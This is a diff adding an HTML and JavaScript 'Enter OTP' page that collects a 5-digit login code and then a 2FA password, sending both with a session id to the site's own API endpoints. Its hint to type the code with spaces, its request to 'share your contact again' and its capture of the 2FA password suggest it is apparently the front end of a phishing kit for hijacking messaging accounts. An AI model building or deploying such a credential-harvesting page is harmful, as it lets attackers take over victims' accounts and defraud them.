@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter OTP</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 14px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .phone-info {
+            background: #e8f5e9;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: bold;
+        }
+        
+        .otp-inputs {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 25px;
+        }
+        
+        .otp-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 600;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            transition: all 0.3s;
+        }
+        
+        .otp-input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            opacity: 0.95;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .error {
+            background: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .error.show {
+            display: block;
+        }
+        
+        .success {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .success-icon {
+            font-size: 60px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .resend-link {
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .resend-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .info-text {
+            text-align: center;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .back-btn {
+            background: #666;
+            margin-top: 10px;
+        }
+        
+        .back-btn:hover {
+            background: #555;
+        }
+        
+        #password-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        
+        #password-input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        .hint {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔢 Enter OTP</h1>
+            <p>OTP sent to your phone</p>
+        </div>
+        
+        <div class="content">
+            <!-- OTP Entry Screen -->
+            <div id="otp-screen">
+                <div class="phone-info" id="phone-display">
+                    Phone: {{ phone }}
+                </div>
+                
+                <div class="error" id="error-message"></div>
+                
+                <div class="info-text">
+                    Enter the 5-digit code sent to your phone<br>
+                    <span class="hint">Format: 9 4 3 8 0 or 94380</span>
+                </div>
+                
+                <div class="otp-inputs">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off" id="otp1">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 2)" autocomplete="off" id="otp2">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 3)" autocomplete="off" id="otp3">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 4)" autocomplete="off" id="otp4">
+                    <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 5)" autocomplete="off" id="otp5">
+                </div>
+                
+                <button class="btn" onclick="verifyOTP()" id="verify-btn" disabled>Verify OTP</button>
+                
+                <div class="resend-link">
+                    <a href="#" onclick="resendOTP()">Resend OTP</a>
+                </div>
+            </div>
+            
+            <!-- 2FA Screen -->
+            <div id="password-screen" class="hidden">
+                <div class="phone-info" id="password-phone-display">
+                    Phone: {{ phone }}
+                </div>
+                
+                <div class="error" id="password-error"></div>
+                
+                <div class="info-text">
+                    Enter your 2FA password
+                </div>
+                
+                <input type="password" id="password-input" 
+                       placeholder="2FA password" autocomplete="off">
+                
+                <button class="btn" onclick="verifyPassword()">Verify Password</button>
+                <button class="btn back-btn" onclick="backToOTP()">Back</button>
+            </div>
+            
+            <!-- Loading Screen -->
+            <div id="loading-screen" class="hidden">
+                <div class="loading">
+                    <div class="loading-spinner"></div>
+                    <p id="loading-text">Processing...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get session ID and phone from template variables
+        const sessionId = '{{ session_id }}';
+        const phoneNumber = '{{ phone }}';
+        
+        let otpCode = '';
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            if (!sessionId) {
+                showError('Session expired or invalid. Please start over.');
+                return;
+            }
+            
+            // Focus first OTP input
+            setTimeout(() => {
+                document.getElementById('otp1').focus();
+            }, 100);
+        });
+        
+        function moveToNext(input, nextIndex) {
+            // Only allow numbers
+            input.value = input.value.replace(/\D/g, '');
+            
+            // Update OTP code
+            const inputs = document.querySelectorAll('.otp-input');
+            otpCode = Array.from(inputs).map(input => input.value).join('');
+            document.getElementById('verify-btn').disabled = otpCode.length !== 5;
+            
+            // Move focus to next input
+            if (input.value.length === 1 && nextIndex <= 5) {
+                const nextInput = document.getElementById(`otp${nextIndex}`);
+                if (nextInput) {
+                    nextInput.focus();
+                }
+            }
+            
+            // Auto-submit if all filled
+            if (otpCode.length === 5) {
+                setTimeout(() => {
+                    verifyOTP();
+                }, 300);
+            }
+        }
+        
+        function verifyOTP() {
+            if (otpCode.length !== 5) {
+                showError('Please enter 5-digit OTP');
+                return;
+            }
+            
+            showLoading('Verifying OTP...');
+            
+            fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    otp: otpCode
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    if (data.requires_2fa) {
+                        showPasswordScreen();
+                    } else {
+                        // Redirect to success page
+                        window.location.href = data.redirect_url;
+                    }
+                } else {
+                    hideLoading();
+                    showError(data.error || 'Verification failed');
+                    
+                    // Clear OTP on error
+                    document.querySelectorAll('.otp-input').forEach(input => {
+                        input.value = '';
+                    });
+                    otpCode = '';
+                    document.getElementById('verify-btn').disabled = true;
+                    document.getElementById('otp1').focus();
+                }
+            })
+            .catch(error => {
+                hideLoading();
+                showError('Network error. Please try again.');
+            });
+        }
+        
+        function resendOTP() {
+            if (confirm('Please share your contact again to receive new OTP.')) {
+                window.location.href = '/';
+            }
+        }
+        
+        function showPasswordScreen() {
+            hideLoading();
+            document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('password-screen').classList.remove('hidden');
+            document.getElementById('password-input').focus();
+        }
+        
+        function backToOTP() {
+            document.getElementById('password-screen').classList.add('hidden');
+            document.getElementById('otp-screen').classList.remove('hidden');
+            document.getElementById('password-input').value = '';
+            document.getElementById('password-error').classList.remove('show');
+            document.getElementById('otp1').focus();
+        }
+        
+        function verifyPassword() {
+            const password = document.getElementById('password-input').value.trim();
+            
+            if (!password) {
+                document.getElementById('password-error').textContent = 'Please enter 2FA password';
+                document.getElementById('password-error').classList.add('show');
+                return;
+            }
+            
+            showLoading('Verifying 2FA password...');
+            
+            fetch('/api/verify-2fa', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    session_id: sessionId,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // Redirect to success page
+                    window.location.href = data.redirect_url;
+                } else {
+                    hideLoading();
+                    document.getElementById('password-error').textContent = data.error || '2FA verification failed';
+                    document.getElementById('password-error').classList.add('show');
+                    document.getElementById('password-input').value = '';
+                    document.getElementById('password-input').focus();
+                }
+            })
+            .catch(error => {
+                hideLoading();
+                document.getElementById('password-error').textContent = 'Network error. Please try again.';
+                document.getElementById('password-error').classList.add('show');
+            });
+        }
+        
+        function showLoading(message) {
+            document.getElementById('loading-text').textContent = message || 'Processing...';
+            document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('password-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+        }
+        
+        function hideLoading() {
+            document.getElementById('loading-screen').classList.add('hidden');
+        }
+        
+        function showError(message) {
+            const errorEl = document.getElementById('error-message');
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+            
+            setTimeout(() => {
+                errorEl.classList.remove('show');
+            }, 5000);
+        }
+        
+        // Keyboard shortcuts
+        document.addEventListener('keydown', function(event) {
+            // Enter key in OTP screen
+            if (event.key === 'Enter' && !document.getElementById('otp-screen').classList.contains('hidden')) {
+                if (otpCode.length === 5) {
+                    verifyOTP();
+                }
+            }
+            
+            // Enter key in password screen
+            if (event.key === 'Enter' && !document.getElementById('password-screen').classList.contains('hidden')) {
+                verifyPassword();
+            }
+            
+            // Escape key goes back from password screen
+            if (event.key === 'Escape' && !document.getElementById('password-screen').classList.contains('hidden')) {
+                backToOTP();
+            }
+            
+            // Backspace navigation in OTP
+            if (event.key === 'Backspace' && !document.getElementById('otp-screen').classList.contains('hidden')) {
+                const activeElement = document.activeElement;
+                if (activeElement && activeElement.classList.contains('otp-input')) {
+                    const inputs = document.querySelectorAll('.otp-input');
+                    const currentIndex = Array.from(inputs).indexOf(activeElement);
+                    
+                    if (activeElement.value === '' && currentIndex > 0) {
+                        // Move to previous input and clear it
+                        inputs[currentIndex - 1].focus();
+                        inputs[currentIndex - 1].value = '';
+                    }
+                }
+            }
+        });
+        
+        // Paste support
+        document.addEventListener('paste', function(event) {
+            const activeElement = document.activeElement;
+            if (activeElement && activeElement.classList.contains('otp-input')) {
+                event.preventDefault();
+                
+                const pastedText = (event.clipboardData || window.clipboardData).getData('text');
+                const numbers = pastedText.replace(/\D/g, '').split('');
+                
+                const inputs = document.querySelectorAll('.otp-input');
+                for (let i = 0; i < Math.min(numbers.length, 5); i++) {
+                    inputs[i].value = numbers[i];
+                }
+                
+                otpCode = Array.from(inputs).map(input => input.value).join('');
+                document.getElementById('verify-btn').disabled = otpCode.length !== 5;
+                
+                if (otpCode.length === 5) {
+                    setTimeout(() => {
+                        verifyOTP();
+                    }, 300);
+                }
+            }
+        });
+    </script>
+</body>
+  </html>
